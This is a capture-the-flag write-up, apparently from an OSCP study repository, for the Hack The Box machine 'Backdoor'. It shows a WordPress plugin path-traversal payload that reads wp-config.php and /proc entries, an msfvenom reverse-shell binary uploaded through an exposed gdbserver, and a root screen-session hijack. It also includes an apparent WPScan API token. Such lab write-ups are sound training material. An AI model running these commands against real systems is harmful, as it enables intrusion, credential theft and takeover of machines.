## Backdoor

Difficulty: Easy

### User Flag

We find a different port open: 1337, but cannot enumerate this service with nmap.

```
rustscan -a backdoor.htb --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/d8f39e46-a250-4231-b12b-1c427620b92a)

<br>

The website uses Wordpress, so we can enumerate plugins here.

![websiteWordpress](https://github.com/b1d0ws/OSCP/assets/58514930/523ecdbc-fb63-4bfb-94cb-98e6c1bf4cc7)

<br>

There are two options, going to wp-content/plugins or using WPScan with an API key.

```
wpscan --url http://backdoor.htb --api-token pP5Ha3o7a3hmaIBueWtYShULJd6FFceslCaQE3LiKYw --enumerate vp --plugins-detection aggressive
```

![wpContentPlugins](https://github.com/b1d0ws/OSCP/assets/58514930/c862062a-4548-4e78-92e9-76b581c68035)

![wpsscan](https://github.com/b1d0ws/OSCP/assets/58514930/321e4eaf-beff-4313-8b0a-18a6ac628ed3)

<br>

WPScan indicate that the plugin Ebook Download has a Directory Traversal vulnerability. Searching for it, we discover how to exploit.

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

![exploit](https://github.com/b1d0ws/OSCP/assets/58514930/87dc9333-4b88-400b-a17d-2cc6d44092dd)

<br>

Since we want to discover what is running on port 1337, we can enumerate the process running.  

First, we fuzz the existing process with fuff inside a for and after analyze each one with the Path Traversal.

```
# Discovering process
for i in $(seq 1 5000); do echo $i >> pid.txt; done && \
ffuf -c -w pid.txt:FUZZ -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -fw 1

# Reading them
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/862/cmdline
```

![ffuf](https://github.com/b1d0ws/OSCP/assets/58514930/d24d9e2c-f57f-4278-b0c6-ddc422cec997)

![readingProc](https://github.com/b1d0ws/OSCP/assets/58514930/8530c461-9b9c-44b7-9ff8-b216767f0946)

<br>

Reading one of the process, we discover that gdbserver is running on port 1337.

We can follow [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver) to get a reverse shell.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

# Set remote debuger target
target extended-remote 10.10.11.125:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run
```

![gdbReverse](https://github.com/b1d0ws/OSCP/assets/58514930/2fb5f059-7079-41ee-9ef7-0dd499dc07ba)

### Root Flag

Enumerating other process, we see that a Cronjob is running this command: 

```
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```

Here we can simply screen the root session and get root user.

```
screen -x root/
```

![process](https://github.com/b1d0ws/OSCP/assets/58514930/d5b9f42e-ba5f-4e23-bded-8927593f03e3)

![rootScreen](https://github.com/b1d0ws/OSCP/assets/58514930/f800cd7c-054c-4f35-ab79-0e68436be37b)
